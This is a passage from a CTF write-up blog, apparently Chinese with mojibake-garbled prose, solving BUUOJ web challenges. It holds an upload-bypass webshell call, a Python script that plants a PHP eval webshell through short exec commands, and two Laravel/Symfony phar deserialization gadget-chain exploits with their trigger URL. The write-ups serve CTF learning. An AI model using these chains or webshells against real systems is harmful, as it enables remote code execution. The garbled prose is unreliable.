// Success upload
} else {
return $this-&amp;gt;error('å†™å…¥æ–‡ä»¶å¤±è´¥ï¼Œå¯èƒ½æ˜¯ç›®æ ‡ç›®å½•ä¸å¯å†™');
}
return [
'name' =&amp;gt; $origin_name,
'filename' =&amp;gt; $new_name,
'type' =&amp;gt; $ext
];
}
}
&lt;/code>&lt;/pre>&lt;p>æ³¨æ„åˆ°è¿™ä¸ªåŽç¼€&lt;/p>
&lt;pre tabindex="0">&lt;code>$filename = !empty($_POST[$this-&amp;gt;field]) ? $_POST[$this-&amp;gt;field] : $_FILES[$this-&amp;gt;field]['name'];
if(!in_array($filename[count($filename)-1], $this-&amp;gt;allow_ext)) {
return $this-&amp;gt;error('åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶');
}
$ext = end($filename);
$target_fullpath = $this-&amp;gt;dist_path . DIRECTORY_SEPARATOR . $new_name;
&lt;/code>&lt;/pre>&lt;p>åœ¨åˆ¤æ–­çš„æ—¶å€™ç”¨çš„æ˜¯&lt;code>count($filename)-1&lt;/code>ï¼Œå˜ç›¸æç¤ºæˆ‘ä»¬å¯ä»¥æœ‰å¾ˆå¤šçš„&lt;code>name&lt;/code>ï¼Œé…åˆæ•°ç»„è¿›è¡Œç»•è¿‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220122191921885.png" alt="image-20220122191921885">&lt;/p>
&lt;pre tabindex="0">&lt;code>/upload/61ebe7df95da2.php?amiz=system('cat /flag_9bc85242c9f1a7663e6806778e8a8558');
&lt;/code>&lt;/pre>&lt;p>flag_9bc85242c9f1a7663e6806778e8a8558&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
*ctf473831530_2018_web_virink_web
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
$sandbox = '/www/sandbox/' . md5('orange' . $_SERVER['REMOTE_ADDR']);
mkdir($sandbox);
chdir($sandbox);
if (isset($_GET['cmd']) &amp;amp;&amp;amp; strlen($_GET['cmd']) &amp;lt;= 20) {
exec($_GET['cmd']);
} else if (isset($_GET['reset'])) {
exec('/bin/rm -rf ' . $sandbox);
}
echo &amp;quot;&amp;lt;br /&amp;gt; IP : {\$_SERVER['REMOTE_ADDR']}&amp;quot;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>è·Ÿorangeä½¬çš„&lt;a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge">[HitconCTF 2017]babyfirst-revenge&lt;/a>ä¸€æ ·ï¼Œå¯¹cmdå­—ç¬¦æ•°æ›´å®½æ¾äº†ï¼Œè¿™é‡Œé‡‡ç”¨å¸ˆå‚…çš„è„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exec_cmd2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># exec cmd&lt;/span>
&lt;span style="color:#111">my_params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">my_params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;exec cmd2&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">write_webshell&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;echo\ &lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;\&amp;#39;\&amp;lt;\?php &lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;eval\(&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;\$_GET\[c\]\)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">r&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;\;\&amp;#39;\&amp;gt;2.php&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">my_params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">my_params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">status_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cmd_list&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ls -tr&amp;gt;1.sh&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;sh 1.sh&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cmd_list&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">exec_cmd2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">write_webshell&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹‹åŽç”¨/sandbox/xxxx/2.php?c=eval($_POST[&amp;lsquo;cmd&amp;rsquo;]);è¿žæŽ¥èšå‰‘ï¼Œä¸è¿‡ç”±äºŽçŽ¯å¢ƒé—®é¢˜ï¼ŒåŽé¢å†…ç½‘çš„éƒ¨åˆ†åšä¸äº†äº†ï¼Œå¯„&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;h2 id="page-08">page 08&lt;/h2>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[HFCTF 2021 Final]tinypng
&lt;/h4>
&lt;/summary>
&lt;p>æ˜¯laravelæ¡†æž¶ï¼Œç»™äº†å¾ˆè¯¦ç»†çš„æºç ï¼Œä½†æ˜¯ä¸»è¦çš„ä¹Ÿå°±æ˜¯è¿™äº›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802232459194.png" alt="image-20210802232459194">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802233146758.png" alt="image-20210802233146758">&lt;/p>
&lt;p>ç»™å‡ºçš„laravelæ¡†æž¶çš„æºç ï¼Œç‰ˆæœ¬æ˜¯8.53.0ï¼Œé¦–å…ˆä»Ž/routes/web.phpå…¥æ‰‹çœ‹ä¸€ä¸‹è·¯ç”±&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804005426972.png" alt="image-20210804005426972">&lt;/p>
&lt;p>ä¸€å…±ä¸¤ä¸ªè·¯ç”±ï¼Œ&lt;code>/&lt;/code>å³&lt;code>/index&lt;/code>ï¼Œå®žçŽ°çš„æ˜¯æ–‡ä»¶ä¸Šä¼ çš„ä¸€äº›å¤„ç† æ¯”å¦‚åŽç¼€çš„è¿‡æ»¤å’Œæ–‡ä»¶åçš„è®¾ç½®ä¹‹ç±»çš„ï¼Œ&lt;code>/image&lt;/code>åˆ™æ˜¯ç‰¹æ®Šçš„ï¼Œè·Ÿè¿‡åŽ»çœ‹ImageControllerç±»&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804005822800.png" alt="image-20210804005822800">&lt;/p>
&lt;p>äº®ç‚¹åœ¨ç¬¬25è¡Œï¼Œæ–°å»ºäº†ä¸€ä¸ªimgcompresså®žä¾‹å¹¶æ‰§è¡ŒcompressImg()ï¼Œè·Ÿè¿‡åŽ»çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804010352158.png" alt="image-20210804010352158">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210804010520380.png" alt="image-20210804010520380">&lt;/p>
&lt;p>é¦–å…ˆè°ƒç”¨çš„&lt;code>_openImage()&lt;/code>é‡Œç¬¬44è¡Œçš„&lt;code>getimagesize()&lt;/code>ç»“åˆpharä¼šè§¦å‘ååºåˆ—åŒ–ï¼Œæ­¤å¤„çš„å‚æ•°$this-&amp;gt;srcæ¥è‡ªäºŽ&lt;code>$source&lt;/code>ï¼Œä¹Ÿå°±æ˜¯&lt;code>$request -&amp;gt; input('image');&lt;/code>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„imageå‚æ•°ï¼Œå¯æŽ§&lt;/p>
&lt;p>ååºåˆ—åŒ–çš„å…¥å£æ‰¾åˆ°äº†ï¼ŒæŽ¥ä¸‹æ¥å°±æ˜¯æ‰¾ä¸€æ‰¾è°ƒç”¨é“¾ï¼Œè¿™é‡Œå°±ç›´æŽ¥æ”¾å‡ºæ¥ï¼ˆæˆ‘å¤ªèœäº† å¯„&lt;/p>
&lt;p>å¯ç”¨é“¾å­1&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Routing\Loader\Configurator&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ImportConfigurator&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$parent&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$route&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$class&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">parent&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$class&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HigherOrderMessage&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$mock&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$class&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$class&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;generate&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PHPUnit\Framework\MockObject&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockTrait&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$mockName&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$classCode&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mockName&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">classCode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;phpinfo();&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">\Symfony\Component\Routing\Loader\Configurator\ImportConfigurator&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">\Mockery\HigherOrderMessage&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">\PHPUnit\Framework\MockObject\MockTrait&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">MockTrait&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">HigherOrderMessage&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">ImportConfigurator&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;__HALT_COMPILER();&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ç”¨é“¾å­2&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BroadcastEvent&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\BroadcastEvent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ls&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">#print(urlencode(serialize($a)));
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;phar.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;__HALT_COMPILER();&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶ç”¨gzipåŽ‹ç¼©åŽä¸Šä¼ ï¼ˆè®°å¾—è¦æ”¹ä¸€ä¸‹content-typeï¼‰ï¼Œåœ¨imageå¤„è®¿é—®&lt;code>/image?image=phar://../storage/app/uploads/xxxxxxxxxx.png&lt;/code>å³å¯çœ‹åˆ°éšè—åœ¨500æŠ¥é”™ä¸‹é¢çš„phpinfo&lt;/p>
